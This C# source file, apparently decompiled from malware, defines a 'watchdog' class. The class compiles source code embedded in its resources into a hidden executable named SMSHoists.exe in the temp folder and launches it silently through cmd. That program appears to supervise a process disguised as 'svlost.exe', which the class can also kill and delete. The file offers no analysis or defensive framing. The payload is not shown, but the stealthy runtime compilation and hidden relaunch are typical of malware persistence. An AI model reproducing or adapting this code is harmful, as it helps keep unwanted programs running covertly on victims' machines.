using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DLL.Properties;
using Microsoft.CSharp;
using Microsoft.VisualBasic;

namespace DLL.Functions;

internal class dog
{
	private static readonly string[] referencedAssemblies = new string[9] { "System.dll", "System.Management.dll", "System.Windows.Forms.dll", "System.Drawing.dll", "Microsoft.VisualBasic.dll", "System.Reflection.dll", "System.Threading.dll", "System.Threading.Tasks.dll", "System.Security.Principal.dll" };

	public dog()
	{
		dog.WatchDogStart();
	}

	public static void WatchDogStart()
	{
		string newValue = Path.Combine(Path.GetTempPath(), "svlost.exe");
		string pathm = Path.GetTempPath();
		CompilerParameters compilerParameters = new CompilerParameters(dog.referencedAssemblies);
		compilerParameters.IncludeDebugInformation = false;
		compilerParameters.CompilerOptions = " /target:winexe /platform:anycpu /optimize+";
		compilerParameters.OutputAssembly = Path.Combine(pathm, "SMSHoists.exe");
		string @string = Resources.String1;
		_ = Process.GetCurrentProcess().MainModule.FileName;
		Process.GetCurrentProcess().Id.ToString();
		@string = @string.Replace("%NAME%", "svlost").Replace("%PATH%", newValue);
		foreach (CompilerError error in new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } }).CompileAssemblyFromSource(compilerParameters, @string).Errors)
		{
			MessageBox.Show(error.ToString());
		}
		if (Information.UBound(Process.GetProcessesByName("SMSHoists")) < 0)
		{
			new Thread((ThreadStart)delegate
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/k start /b " + Path.Combine(pathm, "SMSHoists.exe  & exit"),
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					ErrorDialog = false
				});
			}).Start();
		}
	}

	public static void WatchDogStop()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("svlost");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("svlost");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			File.Delete(Path.Combine(Path.GetTempPath(), "svlost.exe"));
		}
		catch
		{
		}
	}
}
